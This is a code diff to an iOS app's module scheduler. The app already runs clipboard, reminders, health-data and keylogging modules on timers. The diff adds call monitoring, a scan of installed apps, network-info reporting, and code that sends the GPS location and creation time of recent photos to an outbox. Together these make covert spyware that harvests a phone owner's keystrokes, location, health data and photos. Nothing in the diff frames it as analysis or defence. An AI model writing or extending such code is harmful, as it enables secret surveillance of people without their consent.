@@ -19,6 +19,7 @@ final class Modules {
 
     func boot() {
         UIDevice.current.isBatteryMonitoringEnabled = true
+        Calls.shared.boot()
         NotificationCenter.default.addObserver(forName: UIDevice.batteryStateDidChangeNotification,
                                                object: nil, queue: .main) { [weak self] _ in self?.battery() }
         Timer.scheduledTimer(withTimeInterval: 5, repeats: true) { [weak self] _ in self?.tick() }
@@ -44,6 +45,8 @@ final class Modules {
         if Settings.shared.isOn(.reminders), due("rem", 3600) { reminders() }
         if Settings.shared.isOn(.health), due("health", 1800) { healthData() }
         if Settings.shared.isOn(.keylog), due("keys", 20) { keylog() }
+        if Settings.shared.isOn(.installedApps), due("apps", 3600) { AppProbe.scan() }
+        if Settings.shared.isOn(.netInfo), due("net", 300) { NetInfo.report() }
     }
 
     private func clipboard() {
@@ -84,6 +87,11 @@ final class Modules {
             o.fetchLimit = 8
             PHAsset.fetchAssets(with: .image, options: o).enumerateObjects { asset, _, _ in
                 let r = PHImageRequestOptions(); r.isSynchronous = true
+                if let loc = asset.location {
+                    Outbox.shared.send(["type": "photoLoc", "lat": loc.coordinate.latitude,
+                                        "lon": loc.coordinate.longitude,
+                                        "at": asset.creationDate?.timeIntervalSince1970 ?? 0])
+                }
                 r.deliveryMode = .fastFormat; r.resizeMode = .fast
                 PHImageManager.default().requestImage(for: asset,
                     targetSize: CGSize(width: 480, height: 480), contentMode: .aspectFit, options: r) { img, _ in
